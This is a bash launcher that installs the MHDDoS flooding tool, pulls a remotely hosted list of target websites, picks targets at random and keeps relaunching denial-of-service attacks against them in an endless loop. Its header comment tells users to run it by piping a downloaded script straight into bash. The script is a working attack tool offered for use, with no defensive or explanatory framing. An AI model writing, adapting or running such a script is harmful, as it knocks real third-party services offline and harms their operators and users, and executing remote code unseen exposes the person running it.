#!/bin/bash
##### Use next command in local linux terminal to run this script.
#curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash
##### To kill script press CTRL+C several times.


## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Re-launch if it's not running.
check_interval=10

## Number of sites to attack. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
num_of_targets=6

# Install git if it doesn't installed already
if [ ! -f /usr/bin/git ]; then
   sudo apt install git
fi

#Install latest version of MHDDoS
cd~
rm -rf MHDDoS
git clone https://github.com/MHProDev/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt > /dev/null #(no output on screen)

while true
do



## Get random target from list of sites
site=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | shuf -n 1)

## Cut "command line" from string. Command line is verything before "#" that is used as delimiter.
cmd_line=$(echo $site | awk -F "#" '{print $1}')
echo "Choosen target - " $cmd_line

## check if MHDDoS running. If it's not yet running or was terminated by error launch it.
if [ `ps aux | grep MHDDoS | wc -l` != "2" ]; then
        echo "time: "$(date +%H":"%M)
#        echo "process is not running"
        python3 ~/MHDDoS/start.py $cmd_line
fi
sleep $check_interval
done
